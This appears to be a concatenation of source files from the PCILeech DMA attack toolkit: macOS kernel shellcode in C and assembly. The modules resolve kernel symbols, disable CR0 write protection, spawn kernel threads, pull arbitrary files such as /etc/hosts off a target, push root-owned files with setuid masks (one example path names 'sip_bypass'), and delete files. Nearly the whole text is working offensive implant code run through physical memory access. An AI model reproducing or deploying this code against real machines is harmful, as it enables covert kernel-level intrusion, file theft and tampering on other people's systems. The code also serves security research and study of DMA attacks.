; FIND EXPORTED SYMBOL IN THE MACOS-X KERNEL IMAGE
; Function parses the MACH-O header. The symbol string section
; is located at the end of the __LINKEDIT segment. The function
; table is located just before the symbol string section at the
; end of __LINKEDIT. The size of the function table is found in
; the symtab in the mach-o header.
; destroyed registers :: rcx, r8, r9
; rcx -> rdi -> macho_header address
; rdx -> rsi -> ptr to function name
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionMacOS PROC
	; ecx = counter
	; r8  = symtab_command address
	; r9  = symbol_table_current address
	; r10 = string_table_address
	PUSH r10
	PUSH rdi
	PUSH rsi
	MOV rdi, rcx
	MOV rsi, rdx

	CALL macho_parse_find_symtab
	MOV r8, rax
	CALL macho_parse_find_linkedit_end_addr
	MOV r9, rax
	MOV eax, [r8+14h]		; symtab_command->strsize
	SUB r9, rax
	MOV r10, r9

	; SET UP LOOP
	MOV ecx, [r8+0Ch]		; symtab_command->nsyms
	
	finder_loop:
	SUB r9, 10h
	MOV rax, [r9+08h]
	SHR rax, 32
	CMP eax, 0ffffff80h
	JNE finder_loop_next_or_exit

	MOV edi, [r9]
	ADD rdi, r10
	CALL strcmp_simple
	CMP rax, 0
	JE finder_loop_success

	finder_loop_next_or_exit:
	LOOP finder_loop
	XOR rax, rax
	POP rsi
	POP rdi
	POP r10
	RET

	finder_loop_success:
	MOV rax, [r9+08h]
	POP rsi
	POP rdi
	POP r10
	RET 
LookupFunctionMacOS ENDP

PageFlush PROC
	MOV rax, cr3
	MOV cr3, rax
	RET
PageFlush ENDP

GetCR3 PROC
	MOV rax, cr3
	RET
GetCR3 ENDP

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of twelve (12)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi
	PUSH r14
	PUSH r15
	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+4*8+00h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+4*8+08h]
	MOV r9,  [rsp+28h+4*8+10h]
	MOV r15, rsp
	MOV r14, [rsp+28h+4*8+40h] ; 20h stack shadow space + 8h (RET) + 3*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+5*8+38h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+6*8+30h] ; 20h stack shadow space + 8h (RET) + 5*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+7*8+28h] ; 20h stack shadow space + 8h (RET) + 6*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+8*8+20h] ; 20h stack shadow space + 8h (RET) + 7*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+9*8+18h] ; 20h stack shadow space + 8h (RET) + 8*8h PUSH + xxh offset
	PUSH r14
	CALL rax
	MOV rsp, r15
	POP r15
	POP r14
	POP rsi
	POP rdi
	RET
SysVCall ENDP

; ----------------------------------------------------
; Flush the CPU cache.
; ----------------------------------------------------
CacheFlush PROC
	WBINVD
	RET
CacheFlush ENDP

END
```

`pcileech_shellcode/macos_filedelete.c`:

```c
// ax64_filedelete.c : kernel code to delete files on target system.
// Compatible with Apple OS X.
//
// TODO: THIS IS CURRENTLY BROKEN! FIX THIS!!!
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_filedelete.c
// ml64.exe ax64_common_a.asm /Feax64_filedelete.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main ax64_filedelete.obj ax64_common.obj
// shellcode64.exe -o ax64_filedelete.exe "DELETE FILES ON TARGET SYSTEM                                  \nAPPLE OS X EDITION                                             \n===============================================================\nDelete a specified file on the target system.                  \nREQUIRED OPTIONS:                                              \n  -s   : file on target system.                                \n         Example: '-s /tmp/file2delete'                        \n  -0   : run flag - set to non zero to push file.              \n===== DETAILED RESULT INFORMATION =============================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n==============================================================="
//
#include "macos_common.h"

#define CONFIG_MAX_FILESIZE		0x180000 // 1.5MB

typedef struct tdFN2 {
	QWORD vnode_lookup;
	QWORD vnode_getparent;
	QWORD vnode_parent;
	QWORD vnode_put;
	QWORD VNOP_READ;
	QWORD VNOP_OPEN;
	QWORD VNOP_REMOVE;
	QWORD uio_addiov;
	QWORD uio_resid;
	QWORD vfs_context_current;
	QWORD uio_create;
	QWORD uio_free;
	QWORD strlen;
} FN2, *PFN2;

typedef struct componentname {
	/*
	* Arguments to lookup.
	*/
	DWORD	cn_nameiop;	/* lookup operation */
	DWORD	cn_flags;	/* flags (see below) */
#ifdef BSD_KERNEL_PRIVATE
	vfs_context_t	cn_context;
	struct nameidata *cn_ndp;	/* pointer back to nameidata */

								/* XXX use of these defines are deprecated */
#define	cn_proc		(cn_context->vc_proc + 0)	/* non-lvalue */
#define	cn_cred		(cn_context->vc_ucred + 0)	/* non-lvalue */

#else
	void * cn_reserved1;	/* use vfs_context_t */
	void * cn_reserved2;	/* use vfs_context_t */
#endif
							/*
							* Shared between lookup and commit routines.
							*/
	char	*cn_pnbuf;	/* pathname buffer */
	int	cn_pnlen;	/* length of allocated buffer */
	char	*cn_nameptr;	/* pointer to looked up name */
	int	cn_namelen;	/* length of looked up component */
	DWORD	cn_hash;	/* hash value of looked up name */
	DWORD	cn_consume;	/* chars to consume in lookup() */
} COMPONENTNAME;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	pfn2->vnode_lookup = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'l', 'o', 'o', 'k', 'u', 'p', 0 });
	pfn2->vnode_parent = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'a', 'r', 'e', 'n', 't', 0 });
	pfn2->vnode_parent = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'g', 'e', 't', 'p', 'a', 'r', 'e', 'n', 't', 0 });
	pfn2->vnode_put = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'u', 't', 0 });
	pfn2->VNOP_READ = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'A', 'D', 0 });
	pfn2->VNOP_OPEN = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'O', 'P', 'E', 'N', 0 });
	pfn2->VNOP_REMOVE = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'M', 'O', 'V', 'E', 0 });
	pfn2->uio_addiov = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 });
	pfn2->uio_resid = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'r', 'e', 's', 'i', 'd', 0 });
	pfn2->vfs_context_current = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 });
	pfn2->uio_create = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 });
	pfn2->uio_free = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 });
	pfn2->strlen = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 's', 't', 'r', 'l', 'e', 'n', 0 });
	for(QWORD i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		if(!((PQWORD)pfn2)[i]) {
			return FALSE;
		}
	}
	return TRUE;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	DWORD status = 0;
	QWORD vnode = 0, vnode_p = 0, vfs_current;
	COMPONENTNAME cn;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(pk->fn.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	vfs_current = SysVCall(fn2.vfs_context_current);
	if(SysVCall(fn2.vnode_lookup, pk->dataInStr, 2, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}



	
	SysVCall(pk->fn.memset, &cn, 0, sizeof(COMPONENTNAME));
	cn.cn_nameiop = 2; // DELETE
	cn.cn_flags = 0x00008000; // last with this pathname
	cn.cn_reserved1 = vfs_current;
	//cn.obsolete1 = (VOID*)vfs_current;
	cn.cn_pnbuf = pk->dataInStr;
	cn.cn_pnlen = sizeof(pk->dataInStr);
	cn.cn_nameptr = cn.cn_pnbuf;
	cn.cn_namelen = SysVCall(fn2.strlen, pk->dataInStr);
	//cn.obsolete2 = vfs_current;

	//pk->dataOut[2] = SysVCall(fn2.vnode_getparent, vnode);
	vnode_p = SysVCall(fn2.vnode_parent, vnode);
	pk->dataOut[2] = vnode_p;
	/*SysVCall(fn2.vnode_lookup, (CHAR[]) { '/', 'v', 'a', 'r', '/', 'r', 'o', 'o', 't', 0 }, 2, &vnode_p, vfs_current);
	pk->dataOut[3] = vnode_p;*/

	QWORD vnode_2 = 0;
	pk->dataOut[4] = SysVCall(fn2.VNOP_OPEN, vnode_p, &vnode_2, &cn, vfs_current);
	pk->dataOut[5] = vnode_2;


	if(SysVCall(fn2.VNOP_REMOVE, vnode_p, vnode, &cn, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	status = 0x777;

error:
	if(vnode) {
		SysVCall(fn2.vnode_put, vnode);
	}
	if(vnode_p) {
		SysVCall(fn2.vnode_put, vnode_p);
	}
	pk->dataOut[0] = status;
}
```

`pcileech_shellcode/macos_filepull.c`:

```c
// macos_filepull.c : kernel code to pull files from target system.
// Compatible with Apple macOS.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// Inspired by: http://www.phrack.org/papers/revisiting-mac-os-x-kernel-rootkits.html
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_filepull.c
// ml64.exe macos_common_a.asm /Femacos_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_filepull.obj macos_common.obj
// shellcode64.exe -o macos_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \nAPPLE macOS EDITION                                            \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\hosts'                         \n  -s : file on target system.                                  \n         Example: '-s /etc/hosts'                              \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
//
#include "macos_common.h"

typedef struct tdFN2 {
	QWORD vnode_lookup;
	QWORD vnode_put;
	QWORD VNOP_READ;
	QWORD uio_addiov;
	QWORD uio_resid;
	QWORD vfs_context_current;
	QWORD uio_create;
	QWORD uio_free;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'l', 'o', 'o', 'k', 'u', 'p', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'u', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'A', 'D', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'r', 'e', 's', 'i', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionMacOS(pk->AddrKernelBase, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	DWORD status = 0;
	BOOL isModeLargeTransfer = FALSE;
	QWORD uio = 0, vnode = 0, vfs_current, cbOffset = 0;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(pk->fn.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	vfs_current = SysVCall(fn2.vfs_context_current);
	if(SysVCall(fn2.vnode_lookup, pk->dataInStr, 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	while(TRUE) {
		uio = SysVCall(fn2.uio_create, 1 /* count iov */, cbOffset /* offset */, 2 /* kernel addr */, 0 /* read */);
		if(SysVCall(fn2.uio_addiov, uio, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax)) {
			status = STATUS_FAIL_FILE_CANNOT_OPEN;
			goto error;
		}
		if(SysVCall(fn2.VNOP_READ, vnode, uio, 0, vfs_current)) {
			status = STATUS_FAIL_FILE_CANNOT_OPEN;
			goto error;
		}
		pk->dataOutExtraLength = pk->dataOutExtraLengthMax - SysVCall(fn2.uio_resid, uio);
		if(uio) {
			SysVCall(fn2.uio_free, uio);
			uio = 0;
		}
		if(pk->dataOutExtraLength != pk->dataOutExtraLengthMax) { break; }
		isModeLargeTransfer = TRUE;
		cbOffset += pk->dataOutExtraLength;
		if(!WriteLargeOutput_WaitNext(pk)) {
			pk->dataOutExtraLength = 0;
			status = STATUS_FAIL_PCILEECH_CORE;
			goto error;
		}
	}
	if(isModeLargeTransfer) {
		WriteLargeOutput_Finish(pk);
	}
error:
	if(uio) {
		SysVCall(fn2.uio_free, uio);
	}
	if(vnode) {
		SysVCall(fn2.vnode_put, vnode);
	}
	pk->dataOut[0] = status;
}
```

`pcileech_shellcode/macos_filepush.c`:

```c
// macos_filepush.c : kernel code to push files to target system.
// Compatible with Apple macOS.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_filepush.c
// ml64.exe macos_common_a.asm /Femacos_filepush.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_filepush.obj macos_common.obj
// shellcode64.exe -o macos_filepush.exe "PUSH FILES TO TARGET SYSTEM                                    \nAPPLE macOS EDITION                                            \n===============================================================\nPush a file from the local system to the target system.        \nWARNING! Existing files will be overwritten!                   \n* Files created will be created with root/wheel as owner/group \n  and get the access mask specified in the -0 parameter.       \n* Files overwritten will keep the access mask and owner/group. \nREQUIRED OPTIONS:                                              \n  -in  : file to push to target system from this system.       \n         filename is given in normal format.                   \n         Example: '-in c:\temp\random.txt'                     \n  -s : file on target system.                                  \n         Example: '-s /System/Library/Kernels/sip_bypass'      \n  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!    \n         NB! linux file masks are ususally typed in octal -    \n         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)  \n         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)  \n         Example: '-0 0x1ff'                                   \n  -1   : run flag - set to non zero to push file.              \n===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
//
#include "macos_common.h"

#define CONFIG_MAX_FILESIZE			0x180000 // 1.5MB

typedef struct tdFN2 {
	QWORD vnode_open;
	QWORD vnode_close;
	QWORD VNOP_WRITE;
	QWORD uio_addiov;
	QWORD uio_create;
	QWORD uio_free;
	QWORD vfs_context_current;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'W', 'R', 'I', 'T', 'E', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionMacOS(pk->AddrKernelBase, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	DWORD status = 0;
	QWORD uio = 0, vnode = 0, vfs_current;
	if(!pk->dataInStr[0] || !pk->dataIn[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(pk->fn.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	vfs_current = SysVCall(fn2.vfs_context_current);
	if(SysVCall(fn2.vnode_open, pk->dataInStr, 0x0602 /* WRITE|CREATE|TRUNCATE */, pk->dataIn[0], 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	uio = SysVCall(fn2.uio_create, 1 /* count iov */, 0 /* offset */, 2 /* kernel addr */, 1 /* write */);
	if(SysVCall(fn2.uio_addiov, uio, pk->DMAAddrVirtual + pk->dataInExtraOffset, pk->dataInExtraLength)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	if(SysVCall(fn2.VNOP_WRITE, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
error:
	if(uio) {
		SysVCall(fn2.uio_free, uio);
	}
	if(vnode) {
		SysVCall(fn2.vnode_close, vnode, 0x10000 /* descriptor written */, vfs_current);
	}
	pk->dataOut[0] = status;
}
```

`pcileech_shellcode/macos_stage2.asm`:

```asm
; ax64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with OS X.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	main_pre_start:
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_macho_hdr				dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rcx, cr0
	PUSH rcx
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: LOAD OFFSET TO MACH-O HEADER AND FETCH _IOCreateThread
	; ----------------------------------------------------
	MOV eax, [data_offset_macho_hdr]
	LEA rdi, main
	ADD rdi, rax
	LEA rsi, data_str_IOCreateThread
	CALL macho_parse_find_symbol
	; ----------------------------------------------------
	; 6: SPAWN NEW KERNEL THREAD
	; ----------------------------------------------------
	LEA rdi, setup_threadentry
	ENTER 20h, 0
	CALL rax
	CALL write_enable
	LEAVE
	; ----------------------------------------------------
	; 7: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP rax
	MOV cr0, rax
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

; ----------------------------------------------------
; enable supervisor write in cr0
; ----------------------------------------------------
write_enable PROC
	PUSH rax
	MOV rax, cr0
	AND eax, 0fffeffffh
	MOV cr0, rax
	POP rax
	RET
write_enable ENDP

; ----------------------------------------------------
; clear 8192 bytes of memory
; destroyed registers :: rax, rcx
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV rcx, 1024
	loop_8k:
	MOV [rdi+8*rcx-8], rax
	LOOP loop_8k
	RET
clear_8k ENDP

; ----------------------------------------------------
; setup function called by fresh kernel thread
; REGISTER USAGE:
;  rbx: address of allocated memory (physical)
;  r12: address of allocated memory
;  r13: address of kernel memory map
;  r14: address of next page (used for debug)
;  r15: address of mach-o header
; ----------------------------------------------------
setup_threadentry PROC
	; ----------------------------------------------------
	; 0: INITIALIZE
	; ----------------------------------------------------
	CALL write_enable
	LEA r14, main
	AND r14, 0fffffffffffff000h
	ADD r14, 1000h
	MOV eax, [data_offset_macho_hdr]
	LEA r15, main
	ADD r15, rax
	MOV rax, cr3				; DEBUG
	MOV [r14-8*01h], rax		; DEBUG
	; ----------------------------------------------------
	; 1: IOMallocContigious
	; ----------------------------------------------------
	MOV rdi, r15
	LEA rsi, data_str_IOMallocContiguous
	CALL macho_parse_find_symbol
	MOV rdi, 2000h				; param1 = 2 pages of memory
	MOV rsi, 12					; param2 = alignment
	PUSH 0
	MOV rdx, rsp				; param3 = address to place result in
	ENTER 20h, 0
	CALL rax
	LEAVE
	POP rbx
	CALL write_enable
	CMP rax, 0
	JE error
	MOV r12, rax
	MOV [r14-8*03h], rax		; DEBUG
	MOV [r14-8*04h], rbx		; DEBUG
	; ----------------------------------------------------
	; 2: CHECK VALIDITY
	; ----------------------------------------------------
	MOV rax, rbx
	SHR rax, 32
	CMP rax, 0
	JNZ error
	; ----------------------------------------------------
	; 3: CLEAR AND COPY
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rax, 048FFFFFFF1058D48h
	MOV [r12+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r12+1008h], rax
	; ----------------------------------------------------
	; 4: RETRIEVE VM_KERNEL_MAP
	; ----------------------------------------------------
	MOV rdi, r15
	LEA rsi, data_str_kernel_map
	CALL macho_parse_find_symbol
	CMP rax, 0
	JZ error
	MOV r13, [rax]
	; ----------------------------------------------------
	; 5: SET PAGE PROTECTION (RX)
	; ----------------------------------------------------
	MOV rdi, r15
	LEA rsi, data_str_vm_protect
	CALL macho_parse_find_symbol
	MOV rdi, r13				; param1 = kernel_map
	MOV rsi, r12				; param2 = address
	ADD rsi, 1000h
	MOV rdx, 1000h				; param3 = size
	MOV rcx, 0					; param4 = set_maximum
	MOV r8, 5					; param4 = READ/EXECUTE
	CALL rax
	CMP rax, 0
	JNE error
	; ----------------------------------------------------
	; 6: SET RETURN POINTER AND JMP TO NEW AREA
	; (thread_handle not set on macos)
	; ----------------------------------------------------
	MOV [r12+8], r15
	MOV [data_phys_addr_alloc], ebx
	MOV rax, r12
	ADD rax, 1000h
	JMP rax
	; ----------------------------------------------------
	; ERROR HANDLER
	; ----------------------------------------------------
	error:
	MOV eax, 0FFFFFFFFh
	MOV [data_phys_addr_alloc], eax
	RET
setup_threadentry ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; LOCATE THE __LINKEDIT END ADDRESS BY SEARCHING THE MACH-O HEADER.
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_linkedit_end_addr PROC
	MOV eax, 0FEEDFACFh			; mach_header_64 magic
	CMP eax, [rdi]
	JNE error
	MOV eax, 01000007h			; mach_header_64 cputype
	CMP eax, [rdi+4]
	JNE error

	XOR rcx, rcx
	MOV rax, 044454B4E494C5F5Fh		; __LINKED
	loop_search_linkedit:
	CMP rax, [rdi+rcx]
	JE success_search_linkedit
	ADD rcx, 4
	CMP rcx, 2000h
	JE error
	JMP loop_search_linkedit

	success_search_linkedit:
	MOV rax, [rdi+rcx+10h]
	ADD rax, [rdi+rcx+18h]
	RET

	error:
	XOR rax, rax
	RET
macho_parse_find_linkedit_end_addr ENDP

; ----------------------------------------------------
; parse mach-o header to find symtab location.
; NB! no sanity checks performed !!!
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symtab PROC
	MOV rcx, rdi
	ADD rcx, 20h
	
	loop_search_symtab:
	MOV eax, 2
	CMP [rcx], eax
	JE success_search_symtab
	MOV eax, [rcx+4]
	ADD rcx, rax
	JMP loop_search_symtab
	
	success_search_symtab:
	MOV rax, rcx
	RET
macho_parse_find_symtab ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN THE MACOS-X KERNEL IMAGE
; Function parses the MACH-O header. The symbol string section
; is located at the end of the __LINKEDIT segment. The function
; table is located just before the symbol string section at the
; end of __LINKEDIT. The size of the function table is found in
; the symtab in the mach-o header.
; destroyed registers :: rcx, r8, r9
; rdi -> macho_header address
; rsi -> ptr to function name
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symbol PROC
	; ecx = counter
	; r8  = symtab_command address
	; r9  = symbol_table_current address
	; r10 = string_table_address
	PUSH r10
	CALL macho_parse_find_symtab
	MOV r8, rax
	CALL macho_parse_find_linkedit_end_addr
	MOV r9, rax
	MOV eax, [r8+14h]		; symtab_command->strsize
	SUB r9, rax
	MOV r10, r9

	; SET UP LOOP
	MOV ecx, [r8+0Ch]		; symtab_command->nsyms
	
	finder_loop:
	SUB r9, 10h
	MOV rax, [r9+08h]
	SHR rax, 32
	CMP eax, 0ffffff80h
	JNE finder_loop_next_or_exit

	MOV edi, [r9]
	ADD rdi, r10
	CALL strcmp_simple
	CMP rax, 0
	JE finder_loop_success

	finder_loop_next_or_exit:
	LOOP finder_loop
	XOR rax, rax
	POP r10
	RET

	finder_loop_success:
